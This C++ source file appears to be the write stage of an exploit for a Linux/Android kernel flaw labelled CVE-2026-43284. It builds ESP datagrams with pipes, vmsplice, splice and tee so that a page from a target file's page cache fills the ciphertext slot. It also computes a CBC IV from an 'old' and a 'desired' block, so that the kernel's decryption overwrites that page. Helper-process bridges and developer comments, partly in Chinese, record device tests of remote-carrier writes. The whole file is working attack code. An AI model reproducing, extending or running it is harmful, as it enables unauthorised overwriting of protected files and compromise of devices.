/** @file backend/cve_2026_43284/landing/real_splice_io.cpp
 *  The device binding of the splice surface and the concrete system side of the write.
 *
 *  Ported in shape from the old tree's pagecache/splice_io.{hpp,cpp} and the syscall loops of its
 *  pagecache.cpp: a short transfer is retried on the buffer and span writes; -EINTR is retried
 *  without advancing anywhere; the one pipe-to-socket splice retries -EINTR only, because a short
 *  transfer cannot be appended to the same datagram; and every failure before that last splice
 *  closes the pipe without sending -- the same fail-closed rule the write body reports as a block
 *  with no old block.
 *
 *  The wire frame is the buffer the write body assembled, except that the sixteen-byte ciphertext
 *  slot is spliced from the target page: header+vector from memory, page from the file (or from
 *  the bound bridge), check from memory, then the pipe goes to the socket as one datagram.
 *
 *  Android/Linux only for the real calls; any other host gets an all-null surface. No path
 *  allocates.
 */
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

#include "backend/cve_2026_43284/landing/esp_crypto.hpp"
#include "support/gl_log.h"

#include <cerrno>
#include <cstddef>
#include <cstdint>

#if defined(__linux__)
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284::landing {
    namespace {
        /** The in-memory bytes before the ciphertext slot: the header and the vector. */
        constexpr std::size_t kBeforePageBytes = kHeaderBytes + kBlockBytes;
        /** The smallest frame that still leaves the page its slot. */
        constexpr std::size_t kMinDatagramBytes = kBeforePageBytes + kBlockBytes;
        /** The check is at most a SHA-256 digest; the capacity it is written with. */
        constexpr std::size_t kIcvCapacityBytes = 32U;
        /** 诊断探针的粒度：与日志的 512 字节一行同一门限。**不是每块**：载体不可直读时，
         *  每块探一次 = 每块多一次 helper 的 fork+exec（实测 769 块里这第四趟约占 14 s），
         *  而这条「同一个来源读该处得到什么」的证据只在抽样点上才读得出结论。 */
        constexpr std::size_t kProbeEveryBytes = 512U;
        /** tee 事实行的节流：每 256 次 tee 读一行（载体不可直读时一块一次读）；失败时逐块打。 */
        constexpr std::size_t kTeeLogBlocks = 256U;

        /** Writes the whole buffer: short transfers are retried, -EINTR is retried unchanged. */
        [[nodiscard]] bool vmsplice_all(const SpliceIoOps &io, int fd,
                                        const std::uint8_t *data, std::size_t len) noexcept {
            std::size_t done = 0U;
            while (done < len) {
                const std::size_t remaining = len - done;
                const long n = io.vmsplice(fd, data + done, remaining, 0U);
                if (n == -EINTR) continue;
                if (n < 0) return false;
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U || got > remaining) return false;
                done += got;
            }
            return true;
        }

        /** Splices len bytes from in_fd at *offset into out_fd, advancing *offset by what moved. */
        [[nodiscard]] bool splice_span(const SpliceIoOps &io, int in_fd, std::uint64_t *offset,
                                       int out_fd, std::size_t len) noexcept {
            std::size_t done = 0U;
            std::uint64_t cursor = *offset;
            while (done < len) {
                const std::size_t remaining = len - done;
                const long n = io.splice(in_fd, &cursor, out_fd, nullptr, remaining, 0U);
                if (n == -EINTR) continue;
                if (n < 0) return false;
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U || got > remaining) return false;
                done += got;
                cursor += static_cast<std::uint64_t>(got);
            }
            *offset = cursor;
            return true;
        }

        /** The one pipe-to-socket splice: -EINTR is retried, a short transfer is reported as is. */
        [[nodiscard]] long splice_one_datagram(const SpliceIoOps &io, int pipe_fd, int socket_fd,
                                               std::size_t len) noexcept {
            for (;;) {
                const long n = io.splice(pipe_fd, nullptr, socket_fd, nullptr, len, 0U);
                if (n != -EINTR) return n;
            }
        }

        /** Closes what was opened, ownership first, leaving the slots unusable. */
        void close_pair(const SpliceIoOps &io, int fds[2]) noexcept {
            if (fds[0] >= 0) {
                static_cast<void>(io.close_fd(fds[0]));
                fds[0] = -1;
            }
            if (fds[1] >= 0) {
                static_cast<void>(io.close_fd(fds[1]));
                fds[1] = -1;
            }
        }

#if defined(__linux__)
        int real_pipe2(int fds[2], int flags) noexcept {
            return ::pipe2(fds, flags) == 0 ? 0 : -errno;
        }

        long real_splice(int fd_in, const std::uint64_t *off_in, int fd_out,
                         const std::uint64_t *off_out, std::size_t len,
                         unsigned flags) noexcept {
            /* The surface treats the offsets as inputs; splice(2) updates its loff_t values, so
             * the caller's values are copied into locals first. */
            off64_t in_off = 0;
            off64_t out_off = 0;
            off64_t *in_ptr = nullptr;
            off64_t *out_ptr = nullptr;
            if (off_in != nullptr) {
                in_off = static_cast<off64_t>(*off_in);
                in_ptr = &in_off;
            }
            if (off_out != nullptr) {
                out_off = static_cast<off64_t>(*off_out);
                out_ptr = &out_off;
            }
            const ssize_t n = ::splice(fd_in, in_ptr, fd_out, out_ptr, len, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_vmsplice(int fd, const std::uint8_t *data, std::size_t len,
                           unsigned flags) noexcept {
            struct iovec iov {};
            iov.iov_base = const_cast<std::uint8_t *>(data);
            iov.iov_len = len;
            const ssize_t n = ::vmsplice(fd, &iov, 1U, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_send_datagram(int fd, const std::uint8_t *buf, std::size_t len) noexcept {
            struct iovec iov {};
            iov.iov_base = const_cast<std::uint8_t *>(buf);
            iov.iov_len = len;
            struct msghdr msg {};
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1U;
            const ssize_t n = ::sendmsg(fd, &msg, 0);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_read_at(int fd, std::uint8_t *out, std::size_t len,
                          std::uint64_t offset) noexcept {
            const ssize_t n = ::pread(fd, out, len, static_cast<off64_t>(offset));
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_tee(int fd_in, int fd_out, std::size_t len, unsigned flags) noexcept {
            const ssize_t n = ::tee(fd_in, fd_out, len, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_read_pipe(int fd, std::uint8_t *out, std::size_t len) noexcept {
            const ssize_t n = ::read(fd, out, len);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        int real_close_fd(int fd) noexcept {
            return ::close(fd) == 0 ? 0 : -errno;
        }
#endif
    } // namespace

    SpliceIoOps real_splice_io() noexcept {
#if defined(__linux__)
        /* 机械改动：tee/read_pipe 两个入口在 bridge_mode 之后，聚合初始化保持原顺序，再补这两个
         * 可选项（设备上恒为 ::tee / ::read）。 */
        SpliceIoOps ops{&real_pipe2, &real_splice, &real_vmsplice,
                        &real_send_datagram, &real_read_at, &real_close_fd,
                        kBridgeModeDefault};
        /* 机械改动（2026-10-17，真机隔离实验）：tee 路径在**远端载体**上写完回读失败
         *  （write result=failed … reason=verify-read-failed，698 块全写、抽样 23 块全读不回），
         *  与 5efb5983 的失败模式一致。先关掉这两个入口回到「每块两次 helper」的原路径，
         *  验证远端写是否恢复可读；结论明确后再决定 tee 去留。 */
        ops.tee = nullptr;
        ops.read_pipe = nullptr;
        return ops;
#else
        return SpliceIoOps{};
#endif
    }

    long RealSpliceIo::read_at(int fd, std::uint8_t *out, std::size_t size,
                               std::uint64_t offset) noexcept {
        if (out == nullptr || size == 0U) {
            return -EINVAL;
        }
        /* 读的入口（成功历史：pagecache.cpp:116-166 —— 那边先直接 pread，读不满才走注入来源）。 */
        verbose("splice read_at: fd=%d len=%zu offset=%llu", fd, size,
                static_cast<unsigned long long>(offset));
        /* 新的读取代上一块留在管道里的页：那一页只属于紧随其后的一次 splice_one。 */
        drop_pending();
        long direct = -EBADF;
        if (fd >= 0) {
            std::size_t done = 0U;
            bool failed = false;
            while (done < size) {
                const std::size_t remaining = size - done;
                const long n = io_.read_at(fd, out + done, remaining,
                                           offset + static_cast<std::uint64_t>(done));
                if (n == -EINTR) continue;
                if (n < 0) {
                    direct = n;
                    failed = true;
                    break;
                }
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U) {
                    direct = static_cast<long>(done);
                    failed = true;
                    break;
                }
                if (got > remaining) {
                    direct = -EIO;
                    failed = true;
                    break;
                }
                done += got;
            }
            if (!failed) {
                verbose("splice read_at: direct ok fd=%d len=%zu offset=%llu", fd, size,
                        static_cast<unsigned long long>(offset));
                return static_cast<long>(size);
            }
        }
        /* 载体不可直读（fd < 0）、桥可用、且这个面能 tee：一次 helper 同时给出 preimage 与要
         * 送出的页。页被 helper 切进管道后一直留在那里（tee 只复制字节，不移动页），splice_one
         * 再把它移进发送管道 —— 落盘的仍是载体 page cache 的那一页，而这一块只 fork 一次。 */
        if (fd < 0 && size == kBlockBytes && helper_.available() && io_.tee_available()) {
            return read_page_via_helper(out, offset);
        }
        /* The bound source is consulted only when the direct read could not finish, and only for
         * the block it provides; it is all-or-nothing, so the caller checks the count it returns. */
        if (size == kBlockBytes && old_page_.available()) {
            verbose("splice read_at: bridge fd=%d offset=%llu (direct code=%ld)",
                    fd, static_cast<unsigned long long>(offset), direct);
            return old_page_.read16(old_page_.ctx, offset, out);
        }
        warn("splice read_at: direct failed fd=%d len=%zu offset=%llu code=%ld", fd, size,
                static_cast<unsigned long long>(offset), direct);
        return direct;
    }

    long RealSpliceIo::read_page_via_helper(std::uint8_t *out, std::uint64_t offset) noexcept {
        int page[2] = {-1, -1};
        if (io_.pipe2(page, pipe_flags_) != 0) {
            warn("tee: refused off=0x%llx pipe2 failed", static_cast<unsigned long long>(offset));
            return -EIO;
        }
        /* 一次 helper：目标页被切进 P。P 里是载体 page cache 页的引用，不是这十六字节的副本。 */
        const long spliced = helper_.splice16(helper_.ctx, page[1], offset);
        /* 本进程的写端先关：helper 写不满时，读端不能等一条我们还开着的管道。 */
        static_cast<void>(io_.close_fd(page[1]));
        page[1] = -1;
        long result = spliced;
        if (spliced == static_cast<long>(kBlockBytes)) {
            result = teed_preimage(page[0], out, offset);
        }
        if (result == static_cast<long>(kBlockBytes)) {
            pending_page_fd_ = page[0];
            pending_offset_ = offset;
            page[0] = -1; /* 所有权转进 pending 槽，由 splice_one 或下一次读回收。 */
            return result;
        }
        close_pair(io_, page);
        return result;
    }

    long RealSpliceIo::teed_preimage(int page_fd, std::uint8_t *out,
                                     std::uint64_t offset) noexcept {
        ++tee_blocks_;
        const bool log_now = tee_blocks_ == 1U || (tee_blocks_ % kTeeLogBlocks) == 0U;
        if (log_now) {
            verbose("tee: block off=0x%llx page_pipe=%d",
                    static_cast<unsigned long long>(offset), page_fd);
        }
        int copy[2] = {-1, -1};
        if (io_.pipe2(copy, pipe_flags_) != 0) {
            warn("tee: refused off=0x%llx pipe2 failed", static_cast<unsigned long long>(offset));
            return -EIO;
        }
        /* 复制、不消费：源管道里的页原样留着，等 splice_one 移进发送管道。 */
        long copied = -EIO;
        for (;;) {
            copied = io_.tee(page_fd, copy[1], kBlockBytes, 0U);
            if (copied != -EINTR) break;
        }
        /* 复制端先关，读端才不会等一个本进程还开着的写端。 */
        static_cast<void>(io_.close_fd(copy[1]));
        copy[1] = -1;
        long got = copied;
        if (copied == static_cast<long>(kBlockBytes)) {
            got = read_all_pipe(copy[0], out);
        }
        close_pair(io_, copy);
        if (got != static_cast<long>(kBlockBytes)) {
            /* 失败时逐块打：这一行带着块偏移与页管道，和 256 块节流的那一行同一个形状。 */
            verbose("tee: block off=0x%llx page_pipe=%d tee=%ld got=%ld failed=1",
                    static_cast<unsigned long long>(offset), page_fd, copied, got);
            return got;
        }
        if (log_now) {
            verbose("tee: preimage off=0x%llx head=%02x%02x%02x%02x",
                    static_cast<unsigned long long>(offset), static_cast<unsigned>(out[0]),
                    static_cast<unsigned>(out[1]), static_cast<unsigned>(out[2]),
                    static_cast<unsigned>(out[3]));
        }
        return got;
    }

    long RealSpliceIo::read_all_pipe(int fd, std::uint8_t *out) noexcept {
        std::size_t done = 0U;
        while (done < kBlockBytes) {
            const std::size_t remaining = kBlockBytes - done;
            const long n = io_.read_pipe(fd, out + done, remaining);
            if (n == -EINTR) continue;
            if (n < 0) return n;
            if (n == 0) break;
            const std::size_t got = static_cast<std::size_t>(n);
            if (got > remaining) return -EIO;
            done += got;
        }
        return static_cast<long>(done);
    }

    long RealSpliceIo::splice_pending_page(int out_fd) noexcept {
        if (pending_page_fd_ < 0) {
            return -EBADF;
        }
        std::size_t done = 0U;
        while (done < kBlockBytes) {
            const std::size_t remaining = kBlockBytes - done;
            const long n = io_.splice(pending_page_fd_, nullptr, out_fd, nullptr, remaining, 0U);
            if (n == -EINTR) continue;
            if (n < 0) return n;
            const std::size_t got = static_cast<std::size_t>(n);
            if (got == 0U || got > remaining) return -EIO;
            done += got;
        }
        return static_cast<long>(done);
    }

    void RealSpliceIo::drop_pending() noexcept {
        if (pending_page_fd_ >= 0) {
            if (io_.close_fd != nullptr) {
                static_cast<void>(io_.close_fd(pending_page_fd_));
            }
            pending_page_fd_ = -1;
        }
        pending_offset_ = 0U;
    }

    bool RealSpliceIo::splice_one(int socket_fd, const std::uint8_t *datagram,
                                  std::size_t size, std::uint64_t offset) noexcept {
        if (datagram == nullptr || socket_fd < 0) {
            last_error_ = 1;
            return false;
        }
        if (!io_.available()) {
            last_error_ = 2;
            return false;
        }
        /* 页在 read_at 里已经切进 pending 管道：这一块必须用它，且 offset 必须一致。不一致就是
         * 没有页来源 —— 拿报文里的十六字节顶替页就是 5efb5983 的错（页不再附着在载体上），所以
         * 这里 fail-closed，绝不回退到 vmsplice 自己的内存。 */
        if (pending_page_fd_ >= 0 && pending_offset_ != offset) {
            warn("tee: refused pending=0x%llx send=0x%llx",
                    static_cast<unsigned long long>(pending_offset_),
                    static_cast<unsigned long long>(offset));
            drop_pending();
            last_error_ = 5;
            return false;
        }
        if (size < kMinDatagramBytes) {
            drop_pending();
            last_error_ = 3;
            return false; /* Too short to hold the page: refused, not truncated. */
        }
        if (file_fd_ < 0 && !helper_.available()) {
            drop_pending();
            last_error_ = 4;
            return false; /* No ciphertext source, so there is no datagram. */
        }
        /* 发送的入口（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:208-251
         *  —— 那边 pipe2 后依次 vmsplice(header+iv)、splice(页)、vmsplice(icv)，最后 splice(pipe→socket)；
         *  页与 icv 的长度决定 total，短一字节就是短写）。 */
        verbose("splice_one: socket=%d size=%zu offset=%llu before_page=%zu page=%zu file_fd=%d helper=%d",
                socket_fd, size, static_cast<unsigned long long>(offset), kBeforePageBytes, kBlockBytes,
                file_fd_, helper_.available() ? 1 : 0);
        int fds[2] = {-1, -1};
        if (io_.pipe2(fds, pipe_flags_) != 0) {
            last_error_ = 10;
            return false;
        }
        verbose("splice_one: pipe=[%d,%d] flags=0x%x", fds[0], fds[1], static_cast<unsigned>(pipe_flags_));
        bool sent_ok = false;
        for (;;) {
            verbose("splice_one: segment hdr+vector=%zu -> pipe=%d", kBeforePageBytes, fds[1]);
            if (!vmsplice_all(io_, fds[1], datagram, kBeforePageBytes)) { last_error_ = 20; break; }
            if (file_fd_ >= 0) {
                std::uint64_t cursor = offset;
                verbose("splice_one: segment page in_fd=%d -> pipe=%d len=%zu at=%llu",
                        file_fd_, fds[1], kBlockBytes, static_cast<unsigned long long>(offset));
                if (!splice_span(io_, file_fd_, &cursor, fds[1], kBlockBytes)) { last_error_ = 21; break; }
                verbose("splice_one: page spliced=%llu want=%zu cursor=%llu",
                        cursor - offset, kBlockBytes, static_cast<unsigned long long>(cursor));
            } else if (pending_page_fd_ >= 0) {
                /* 页已经由 read_at 的一次 helper 切进 P，仍附着在载体的 page cache 上：这里把管道
                 * 缓冲移进发送管道（pipe→pipe 只转移页引用，不复制数据、不换页），这一块不再 fork。 */
                const long spliced = splice_pending_page(fds[1]);
                verbose("tee: spliced=%ld", spliced);
                drop_pending();
                if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
            } else {
                const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
                /* 并排事实（**抽样块才做**）：helper 送进管道的块数，以及经同一来源读该处会得到的
                 * 前 4 字节。每块都做等于每块多一次 helper exec —— 那一次读不参与组帧，只供对照，
                 * 所以它按 512 字节的粒度抽样；管道里的页仍由上面那一次 splice16 放进来的页缓存
                 * 提供，**页身份不变**（本文件的页来源语义没有动过）。 */
                /* 探针的粒度随桥形态：spawn 下一次读是一次 fork（所以按 512 字节抽样）；session 下一次
                 *  读只值一次 IPC，所以每块都能读 —— 这是唯一由 SpliceIoOps::bridge_mode 改变的行为，
                 *  默认 spawn 时与抽样落地之后的代码逐字节等价。 */
                const bool probe_now = io_.bridge_mode == kBridgeModeSession ||
                                       (offset % kProbeEveryBytes) == 0U;
                if (probe_now) {
                    std::uint8_t probe[kBlockBytes] = {};
                    const long probed = old_page_.available()
                                       ? old_page_.read16(old_page_.ctx, offset, probe)
                                       : -1;
                    verbose("helper splice: offset=%llu spliced=%ld probed=%ld head=%02x%02x%02x%02x fd=%d helper_avail=%d",
                            static_cast<unsigned long long>(offset), spliced, probed,
                            static_cast<unsigned>(probe[0]), static_cast<unsigned>(probe[1]),
                            static_cast<unsigned>(probe[2]), static_cast<unsigned>(probe[3]),
                            file_fd_, helper_.available() ? 1 : 0);
                } else {
                    verbose("helper splice: offset=%llu spliced=%ld (probe off-cadence)",
                            static_cast<unsigned long long>(offset), spliced);
                }
                if (spliced != static_cast<long>(kBlockBytes)) { last_error_ = 22; break; }
            }
            const std::size_t suffix = size - kMinDatagramBytes;
            verbose("splice_one: segment icv=%zu (prefix=%zu)", suffix, kMinDatagramBytes);
            if (!vmsplice_all(io_, fds[1], datagram + kMinDatagramBytes, suffix)) { last_error_ = 23; break; }
            const long sent = splice_one_datagram(io_, fds[0], socket_fd, size);
            verbose("splice_one: datagram sent=%ld want=%zu pipe=%d socket=%d",
                    sent, size, fds[0], socket_fd);
            if (sent != static_cast<long>(size)) { last_error_ = sent < 0 ? static_cast<int>(sent) : 24; break; }
            sent_ok = true;
            break;
        }
        close_pair(io_, fds);
        /* 结果（成功历史：pagecache.cpp:246-250 —— 那边 sent < 0 或 sent != total 都算失败）。 */
        verbose("splice_one: done ok=%d last_error=%d (0=no failure, 10=pipe, 20=hdr, 21=page, 22=helper, 23=icv, 24=short)",
                sent_ok ? 1 : 0, sent_ok ? 0 : last_error_);
        return sent_ok;
    }

    void RealSpliceIo::compute_iv(const std::uint8_t old_block[kBlockBytes],
                                  const std::uint8_t desired_block[kBlockBytes],
                                  const std::uint8_t key[32],
                                  std::uint8_t out[kBlockBytes]) noexcept {
        static_cast<void>(esp_cbc_iv(old_block, desired_block, key, out));
    }

    void RealSpliceIo::compute_icv(const std::uint8_t *datagram, std::size_t size,
                                   const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                                   std::uint8_t *out) noexcept {
        static_cast<void>(esp_icv(datagram, size, hmac_key, icv_len, out, kIcvCapacityBytes));
    }
}  // namespace ghostlock::backend::cve_2026_43284::landing
